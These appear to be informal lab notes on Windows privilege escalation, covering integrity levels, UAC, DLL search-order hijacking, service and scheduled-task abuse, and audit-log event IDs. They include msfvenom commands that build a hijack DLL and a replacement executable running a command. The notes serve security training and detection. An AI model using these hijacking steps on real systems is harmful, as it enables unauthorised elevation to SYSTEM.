windows exploitation
"Windows Integrity Mechanism"
"Integrity Levels"
*Untrusted*
Anonymous SID access tokens
*Low*
Everyone SID access token (World)
*Medium*
Authenticated Users
*High*
Administrators
*System*
System services (LocalSystem, LocalService, NetworkService)

"User Account Control (UAC)"
    Always Notify
    Notify me only when programs try to make changes to my computer
    Notify me only when programs try to make changes to my computer (do not dim my desktop)
    Never notify
"Checking UAC Settings"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

"AutoElevate Executables"
Requested Execution Levels:
    asInvoker
    highestAvailable

"DLL Search Order"
Executables check the following locations (in successive order):
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
 ** The directory the the Application was run from <------------------------------------------------ /***what we are targeting***\
    The directory specified in in the C+ function GetSystemDirectory()
    The directory specified in the C+ function GetWindowsDirectory()
    The current directory

"Scheduled Tasks & Services"
Items to evaluate include:
    Write Permissions
    Non-Standard Locations
    Unquoted Executable Paths
    Vulnerabilities in Executables
    Permissions to Run As SYSTEM

net use z: "\\http://live,sysinternals.com" /persiste
mkdir "C:\Program Files (x86)\Putty"
 move C:\Users\student\Downloads\putty.exe "C:\Program Files (x86)\Putty\putty.exe
 .\sc.exe create puttyService binpath='C:\Program Files (x86)\Putty\putty.exe' displayname='puttyService' start=auto
mkdir "C:\Program Files (x86)\Putty"


scheduled tasks > action > create task > Change User "SYSTEM" | Triggers > new > At startup, disable enabled 
Actions > new, clcik on putty.exe in script field

Services > Despcription > go to where path in description leads to > check if you have right permissions
.\Procmon.exe Process Name contains Putty.exe Path Contains .dll, Result is NAME NOT FOUND

Crafting a Payload/.dll hijhacking
msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll

if you can rename it, then .exe replacement works
 msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\Desktop\whoami.txt' -f exe > putty.exe


DEMO: Audit Logging
Show all audit category settings
auditpol /get /category:*
What does the below command show?
auditpol /get /category:* | findstr /i "success failure"

Important Microsoft Event IDs
4624/4625
Successful/failed login
4720
Account created
4672
Administrative user logged on
7045
Service created



















































